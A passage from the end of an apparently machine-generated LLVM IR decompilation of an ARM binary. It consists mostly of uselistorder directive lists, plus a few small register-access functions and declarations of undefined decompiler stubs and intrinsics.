276, 1115, 282, 1116, 688, 311, 310, 309, 308, 312, 1117, 689, 224, 223, 222, 221, 225, 424, 525, 809, 526, 810, 461, 811, 972, 528, 973, 538, 812, 425, 539, 540, 795, 797, 529, 794, 531, 796, 532, 798, 530, 799, 800, 533, 801, 802, 536, 803, 804, 534, 805, 806, 535, 807, 808, 537, 813, 975, 974, 976, 541, 977, 978, 979, 542, 980, 780, 983, 982, 527, 981, 984, 985, 543, 986, 989, 990, 544, 991, 545, 992, 546, 993, 547, 994, 548, 995, 549, 996, 550, 997, 551, 998, 552, 999, 426, 1006, 1007, 375, 553, 702, 701, 700, 699, 698, 697, 696, 695, 694, 693, 692, 691, 690, 319, 322, 318, 323, 317, 320, 321, 1000, 1001, 554, 1002, 1003, 555, 1004, 1005, 254, 253, 252, 258, 255, 256, 257, 251, 250, 556, 557, 704, 703, 325, 326, 815, 816, 463, 817, 818, 819, 820, 821, 822, 823, 364, 372, 824, 825, 427, 365, 826, 462, 827, 828, 829, 830, 366, 371, 831, 832, 428, 367, 833, 558, 834, 835, 559, 836, 560, 837, 561, 838, 839, 562, 840, 563, 841, 385, 844, 842, 843, 368, 369, 845, 564, 846, 712, 630, 711, 710, 709, 708, 707, 706, 629, 705, 288, 286, 287, 292, 289, 294, 291, 290, 293, 713, 259, 932, 439, 386, 714, 136, 135, 134, 133, 137, 131, 129, 128, 130, 132, 873, 874, 875, 876, 565, 716, 715, 264, 265, 262, 266, 263, 267, 272, 273, 274, 260, 261, 268, 269, 271, 270, 566, 567, 568, 466, 465, 464, 569, 723, 722, 631, 721, 720, 719, 718, 717, 632, 234, 572, 571, 570, 847, 725, 724, 573, 851, 443, 852, 442, 853, 441, 854, 440, 855, 856, 574, 444, 575, 857, 576, 577, 578, 579, 376, 580, 737, 736, 735, 734, 733, 732, 731, 730, 729, 728, 727, 726, 231, 232, 862, 868, 10, 429, 863, 581, 864, 9, 865, 447, 866, 430, 431, 867, 869, 870, 448, 871, 741, 740, 633, 634, 739, 738, 987, 467, 468, 146, 145, 144, 147, 143, 988, 11, 12, 13, 877, 878, 582, 879, 583, 880, 881, 882, 883, 449, 450, 584, 884, 585, 885, 886, 586, 887, 888, 587, 889, 891, 890, 745, 744, 743, 742, 237, 238, 239, 242, 244, 245, 243, 241, 240, 892, 894, 588, 893, 589, 747, 746, 157, 159, 160, 156, 158, 895, 897, 590, 898, 896, 591, 470, 469, 592, 748, 304, 302, 305, 306, 301, 303, 899, 900, 593, 901, 473, 471, 472, 902, 749, 170, 172, 171, 903, 905, 594, 906, 904, 595, 475, 907, 474, 908, 750, 186, 188, 189, 190, 185, 187, 909, 911, 596, 912, 910, 597, 477, 476, 598, 913, 599, 914, 751, 60, 61, 63, 64, 65, 58, 59, 62, 915, 916, 917, 918, 919, 600, 920, 601, 921, 602, 482, 481, 603, 922, 478, 923, 479, 924, 480, 925, 755, 754, 753, 752, 202, 200, 201, 203, 204, 206, 205, 199, 207, 926, 929, 927, 928, 604, 483, 484, 605, 930, 485, 931, 756, 151, 149, 153, 154, 155, 152, 150, 933, 936, 934, 935, 606, 488, 487, 607, 937, 486, 938, 761, 760, 759, 758, 757, 81, 85, 86, 87, 84, 83, 82, 939, 489, 608, 247, 248, 249, 1118, 762, 169, 965, 763, 126, 1009, 1012, 609, 1013, 1014, 1010, 1011, 1015, 1016, 123, 122, 125, 121, 124, 1018, 610, 764, 1119, 275, 1120, 616, 1121, 1122, 614, 1123, 615, 1124, 1125, 1126, 452, 617, 1127, 618, 1128, 435, 1129, 1130, 491, 1131, 1132, 434, 1133, 1134, 619, 1135, 1136, 1137, 1138, 1139, 388, 1140, 620, 1141, 621, 622, 1142, 1143, 1144, 1145, 436, 1146, 1147, 437, 1148, 1149, 438, 1150, 389, 433, 432, 1151, 1152, 613, 1153, 1154, 1155, 611, 1156, 387, 612, 490, 1157, 1159, 1160, 1158, 623, 1161, 624, 1162, 625, 1163, 1164, 779, 1165, 453, 1166, 1167, 451, 626, 1168, 776, 775, 774, 773, 772, 771, 770, 769, 768, 767, 766, 765, 109, 111, 114, 116, 115, 110, 112, 113, 777, 778, 307 }
  uselistorder label %dec_label_pc_18480, { 1, 0 }
  uselistorder label %dec_label_pc_183fc, { 1, 0 }
  uselistorder label %dec_label_pc_183ac, { 1, 0 }
  uselistorder label %dec_label_pc_18390, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18348, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_18508(i32 %arg1) local_unnamed_addr {
dec_label_pc_18508:
  %v0_18508 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18508, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18508
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18508, %bb
  %v10_18510 = phi i32 [ %arg1, %dec_label_pc_18508 ], [ 0, %bb ]
  ret i32 %v10_18510

; uselistorder directives
  uselistorder i1 false, { 45, 46, 47, 49, 48, 50, 11, 12, 34, 14, 17, 16, 15, 23, 35, 36, 37, 13, 38, 39, 40, 41, 0, 2, 29, 28, 19, 20, 3, 25, 1, 9, 10, 18, 4, 5, 6, 30, 22, 42, 43, 44, 7, 8, 31, 32, 33, 21, 26, 27, 24, 51 }
  uselistorder i1* @cpsr_z, { 2, 3, 5, 6, 4, 7, 8, 19, 20, 1, 9, 10, 11, 12, 21, 22, 13, 23, 25, 27, 26, 24, 14, 15, 16, 17, 18, 28, 29, 30, 31, 32, 51, 52, 53, 61, 62, 63, 64, 33, 34, 35, 36, 37, 38, 0, 39, 47, 48, 49, 50, 40, 41, 42, 43, 44, 45, 46, 54, 55, 56, 57, 58, 59, 60, 65, 66 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_19764() local_unnamed_addr {
dec_label_pc_19764:
  %v1_19768 = call i32 @function_14e3c(i32 6)
  %v1_19770 = call i32 @function_14e3c(i32 9)
  br label %dec_label_pc_19774

dec_label_pc_19774:                               ; preds = %dec_label_pc_19774, %dec_label_pc_19764
  br label %dec_label_pc_19774

; uselistorder directives
  uselistorder i32 9, { 11, 37, 38, 58, 59, 0, 64, 7, 65, 8, 39, 40, 13, 41, 12, 14, 42, 34, 60, 5, 35, 61, 36, 15, 63, 16, 43, 44, 3, 17, 18, 1, 19, 20, 21, 22, 2, 23, 24, 62, 4, 45, 46, 9, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 6, 57, 32, 31, 30, 29, 28, 27, 26, 25, 33, 66, 67, 10, 68 }
  uselistorder i32 (i32)* @function_14e3c, { 3, 2, 0, 1 }
  uselistorder i32 6, { 14, 79, 0, 15, 81, 80, 82, 16, 40, 17, 41, 3, 77, 18, 78, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 1, 30, 31, 32, 33, 5, 34, 42, 43, 44, 6, 45, 46, 47, 48, 7, 49, 50, 51, 52, 8, 9, 53, 54, 55, 35, 56, 10, 57, 58, 36, 59, 11, 60, 61, 37, 62, 63, 64, 65, 66, 38, 67, 12, 68, 69, 70, 71, 72, 73, 39, 74, 13, 75, 4, 76, 2 }
}

define i32 @function_19778() local_unnamed_addr {
entry:
  %v3_19778 = load i32, i32* @r0, align 4
  ret i32 %v3_19778

; uselistorder directives
  uselistorder i32 0, { 118, 756, 757, 154, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 37, 96, 423, 768, 155, 769, 770, 771, 0, 772, 773, 1, 156, 774, 775, 776, 719, 1061, 1062, 164, 1063, 2, 1064, 165, 157, 1065, 163, 160, 161, 162, 159, 1066, 158, 1067, 1068, 777, 168, 778, 3, 779, 169, 780, 720, 781, 120, 782, 721, 783, 784, 166, 785, 786, 787, 167, 119, 788, 121, 122, 789, 790, 791, 1207, 1208, 152, 113, 114, 1209, 170, 1210, 1211, 1212, 1213, 1214, 4, 792, 793, 794, 693, 795, 42, 796, 797, 798, 799, 5, 800, 801, 802, 803, 804, 694, 6, 805, 695, 806, 722, 807, 808, 809, 810, 811, 812, 813, 38, 43, 816, 424, 815, 80, 81, 814, 425, 818, 349, 817, 1069, 426, 1070, 1071, 1526, 350, 1527, 427, 44, 1215, 1072, 172, 171, 847, 848, 104, 849, 850, 174, 173, 851, 852, 853, 175, 854, 1216, 7, 8, 176, 72, 419, 375, 376, 1217, 1218, 178, 1219, 177, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 179, 1228, 1229, 1230, 1231, 1232, 1233, 184, 185, 186, 187, 188, 1234, 183, 180, 181, 182, 1235, 1236, 45, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 1237, 190, 189, 191, 1238, 115, 1239, 1073, 1074, 1075, 428, 1076, 1077, 437, 438, 439, 432, 433, 434, 1078, 435, 436, 1079, 440, 441, 442, 1080, 1081, 1082, 1083, 445, 1084, 1085, 195, 196, 1086, 1087, 197, 1088, 1089, 430, 429, 1090, 1091, 1092, 1093, 73, 1094, 1097, 46, 47, 1095, 1096, 446, 1098, 1099, 192, 193, 377, 443, 1100, 444, 431, 1101, 1102, 198, 194, 1103, 117, 74, 1104, 1105, 1106, 1107, 133, 1108, 1109, 134, 135, 1529, 1528, 1530, 199, 200, 342, 1566, 1567, 202, 201, 351, 447, 1565, 819, 203, 1240, 9, 378, 448, 449, 1241, 450, 204, 820, 821, 1243, 451, 1242, 82, 83, 1244, 1245, 1121, 855, 856, 857, 10, 11, 858, 1246, 1247, 1249, 1250, 723, 84, 105, 1251, 1248, 822, 823, 824, 825, 452, 826, 1568, 1569, 1570, 1571, 1252, 724, 1253, 1254, 725, 726, 1255, 1256, 1257, 1258, 727, 696, 1531, 1532, 1533, 697, 1534, 1535, 77, 78, 79, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 728, 698, 1548, 1549, 1550, 1551, 699, 1552, 700, 1553, 1554, 1555, 1556, 1557, 701, 1558, 1559, 1560, 1561, 729, 702, 1562, 1563, 1564, 1112, 827, 1110, 207, 380, 379, 206, 205, 1111, 881, 882, 208, 136, 209, 859, 860, 453, 12, 381, 454, 210, 861, 455, 456, 457, 13, 1200, 1259, 1260, 1261, 1262, 1263, 370, 369, 368, 1264, 211, 883, 48, 49, 50, 51, 52, 212, 1113, 1114, 458, 1115, 1116, 459, 1117, 1118, 213, 214, 1265, 1266, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 215, 1267, 216, 1268, 1269, 1270, 1271, 1272, 420, 382, 383, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 460, 1281, 1282, 1283, 1284, 1285, 1286, 1335, 1337, 1336, 1338, 1339, 1340, 1341, 1357, 461, 1358, 1359, 1360, 1361, 1362, 1363, 462, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 85, 137, 217, 1371, 1287, 1288, 1289, 1290, 1291, 218, 1292, 463, 1293, 1294, 1295, 1296, 464, 1297, 1298, 1299, 1300, 86, 1301, 1302, 1303, 1304, 1305, 1321, 1322, 465, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 139, 138, 1332, 1333, 1334, 1306, 1307, 1308, 1309, 466, 1310, 1311, 1312, 1313, 219, 1314, 1315, 467, 1316, 1317, 1318, 1319, 1320, 1342, 1343, 1344, 1345, 468, 1346, 1347, 1348, 1349, 220, 1350, 1351, 469, 1352, 1353, 1354, 1355, 1356, 1372, 221, 1373, 1374, 916, 917, 106, 918, 470, 471, 1375, 472, 1376, 1377, 222, 473, 1572, 474, 1573, 1574, 1575, 1576, 692, 352, 223, 1577, 890, 891, 224, 892, 39, 14, 893, 894, 140, 141, 225, 895, 896, 897, 15, 1378, 1379, 1380, 1381, 109, 1382, 226, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 227, 703, 730, 704, 705, 1390, 1391, 1392, 1393, 1394, 1395, 16, 1396, 1397, 110, 1398, 1399, 1400, 1401, 1402, 228, 1403, 706, 731, 707, 708, 1404, 732, 153, 229, 1405, 1406, 1407, 107, 366, 1408, 1409, 53, 142, 733, 353, 18, 17, 230, 1410, 231, 734, 19, 354, 232, 233, 234, 1411, 54, 1412, 235, 475, 1132, 898, 899, 900, 1414, 1413, 1415, 1416, 1417, 1418, 40, 236, 1419, 1420, 1421, 237, 1422, 97, 98, 421, 422, 239, 238, 240, 1423, 241, 1424, 1425, 242, 1191, 1192, 476, 243, 244, 245, 1426, 246, 1427, 1133, 249, 1134, 1135, 477, 1136, 839, 840, 247, 248, 841, 843, 828, 99, 55, 346, 345, 829, 830, 735, 831, 842, 478, 838, 736, 832, 737, 833, 738, 834, 739, 835, 740, 836, 741, 837, 844, 845, 479, 846, 111, 1137, 691, 1138, 480, 1139, 1140, 356, 355, 1141, 1142, 1143, 1144, 251, 250, 1145, 1146, 1147, 742, 343, 1148, 89, 90, 344, 1149, 87, 88, 481, 1151, 1152, 709, 1153, 1154, 1155, 1156, 1157, 482, 1158, 1159, 1161, 718, 1162, 1163, 1164, 717, 1165, 1166, 483, 1167, 484, 1168, 1171, 1172, 1173, 252, 1169, 253, 1170, 254, 1150, 865, 866, 867, 101, 56, 868, 100, 57, 869, 870, 485, 871, 486, 487, 872, 488, 873, 874, 876, 255, 256, 875, 367, 58, 91, 371, 877, 257, 20, 878, 919, 920, 923, 924, 925, 921, 922, 926, 927, 862, 21, 863, 258, 489, 864, 879, 490, 880, 491, 492, 263, 262, 743, 143, 265, 264, 744, 144, 267, 266, 745, 145, 269, 268, 746, 146, 747, 261, 260, 259, 358, 359, 360, 361, 493, 270, 887, 884, 885, 886, 357, 888, 59, 889, 271, 494, 108, 901, 902, 903, 904, 364, 905, 906, 907, 363, 908, 909, 910, 911, 272, 912, 914, 913, 147, 148, 273, 362, 495, 915, 496, 497, 384, 274, 275, 1160, 75, 276, 928, 929, 278, 279, 930, 931, 60, 277, 112, 280, 76, 498, 932, 933, 934, 935, 281, 282, 936, 937, 388, 938, 939, 940, 941, 286, 283, 284, 285, 942, 943, 944, 945, 499, 946, 947, 387, 948, 386, 949, 385, 950, 500, 951, 288, 952, 289, 954, 955, 61, 953, 287, 956, 290, 102, 291, 957, 391, 389, 958, 390, 959, 294, 960, 295, 962, 963, 62, 293, 961, 292, 964, 296, 297, 965, 394, 966, 392, 393, 967, 501, 968, 502, 103, 63, 969, 149, 395, 503, 970, 971, 298, 972, 396, 973, 300, 974, 301, 977, 978, 64, 975, 299, 976, 150, 979, 22, 23, 24, 25, 26, 980, 302, 303, 981, 398, 982, 397, 983, 504, 984, 505, 985, 506, 986, 507, 987, 508, 988, 509, 989, 306, 991, 992, 993, 994, 304, 307, 995, 996, 65, 66, 990, 305, 998, 997, 27, 28, 29, 30, 31, 308, 309, 999, 401, 1000, 400, 1001, 510, 1002, 511, 1003, 512, 1004, 513, 1005, 514, 1006, 399, 1007, 515, 1008, 313, 1010, 1011, 1012, 311, 310, 314, 1013, 1014, 67, 68, 1009, 312, 69, 516, 1016, 1018, 1019, 1020, 517, 1021, 518, 1022, 32, 33, 34, 35, 36, 1017, 1015, 315, 1023, 1024, 407, 1025, 406, 1026, 405, 1027, 404, 1028, 403, 1029, 402, 1030, 519, 1031, 1034, 1035, 1036, 317, 318, 1037, 1038, 70, 1032, 1033, 316, 1039, 1040, 319, 320, 1041, 410, 1042, 409, 1043, 408, 1044, 520, 1045, 1047, 1048, 1049, 322, 323, 324, 1051, 1052, 71, 1050, 1046, 321, 1053, 1054, 325, 326, 1055, 413, 1056, 412, 1057, 411, 1058, 521, 1059, 372, 1060, 1428, 327, 1429, 1119, 328, 1120, 1174, 1175, 1176, 1177, 1178, 1179, 331, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 329, 330, 1188, 1189, 1190, 1193, 116, 1194, 1195, 373, 522, 365, 1196, 1197, 41, 1198, 1199, 523, 1201, 332, 1430, 1202, 1203, 1204, 1205, 1206, 1431, 1432, 1433, 1434, 333, 334, 524, 1435, 1436, 710, 711, 712, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 748, 1449, 1450, 1451, 1452, 749, 1453, 1454, 1455, 713, 1456, 714, 335, 336, 337, 1457, 1458, 1459, 1460, 750, 1461, 1462, 151, 1463, 1464, 751, 1465, 338, 1466, 1467, 1468, 752, 525, 526, 1469, 1470, 753, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 527, 1485, 1480, 1481, 1482, 1483, 754, 1484, 755, 1486, 528, 1487, 1488, 1489, 1490, 529, 1491, 1492, 1493, 1494, 715, 1496, 1497, 1498, 1499, 1500, 374, 1501, 1504, 1505, 1502, 1503, 340, 339, 1506, 1507, 1508, 1509, 341, 1510, 1511, 347, 1512, 92, 93, 348, 1513, 94, 95, 530, 1514, 1495, 689, 690, 1515, 1516, 716, 1517, 1518, 1519, 1520, 1521, 531, 1522, 414, 1523, 415, 1524, 532, 416, 417, 1525, 418, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592 }
  uselistorder i32* @r0, { 91, 276, 277, 278, 279, 280, 281, 282, 283, 4, 284, 285, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 15, 286, 338, 339, 340, 37, 11, 33, 287, 288, 16, 64, 18, 27, 39, 187, 28, 289, 441, 442, 440, 104, 40, 45, 29, 24, 0, 13, 188, 65, 341, 17, 38, 105, 31, 290, 5, 66, 67, 1, 61, 332, 14, 68, 69, 70, 342, 71, 343, 291, 292, 21, 30, 72, 22, 41, 344, 19, 345, 12, 294, 295, 296, 297, 23, 73, 346, 347, 348, 74, 349, 350, 351, 368, 85, 375, 376, 86, 87, 377, 378, 75, 352, 353, 76, 6, 354, 77, 355, 356, 80, 364, 81, 82, 365, 366, 367, 357, 78, 358, 359, 360, 361, 79, 2, 362, 363, 369, 83, 370, 371, 372, 84, 3, 373, 374, 379, 189, 380, 242, 88, 381, 89, 90, 34, 35, 25, 10, 443, 444, 36, 445, 9, 32, 224, 26, 382, 20, 383, 384, 298, 385, 386, 387, 388, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 175, 176, 177, 178, 179, 180, 181, 182, 183, 299, 184, 158, 159, 185, 161, 162, 173, 174, 160, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 186, 300, 301, 302, 303, 304, 306, 307, 308, 309, 310, 313, 316, 314, 315, 305, 190, 198, 199, 200, 59, 60, 191, 192, 193, 194, 195, 196, 197, 201, 202, 42, 203, 204, 205, 206, 54, 55, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 56, 217, 57, 218, 219, 58, 220, 221, 222, 223, 43, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 44, 239, 240, 241, 311, 312, 7, 243, 244, 245, 46, 246, 247, 248, 249, 250, 47, 251, 252, 253, 48, 254, 255, 256, 257, 258, 49, 259, 260, 261, 50, 262, 263, 264, 265, 266, 267, 51, 268, 269, 270, 271, 52, 272, 273, 274, 275, 53, 293, 317, 318, 319, 320, 321, 322, 8, 323, 324, 325, 326, 327, 328, 329, 330, 331, 62, 63, 333, 334, 335, 389, 336, 390, 337, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439 }
}

declare i32 @unknown_ffff0fc0() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #1

declare float @fabsf(float)

attributes #0 = { nounwind readnone }
attributes #1 = { noreturn nounwind }
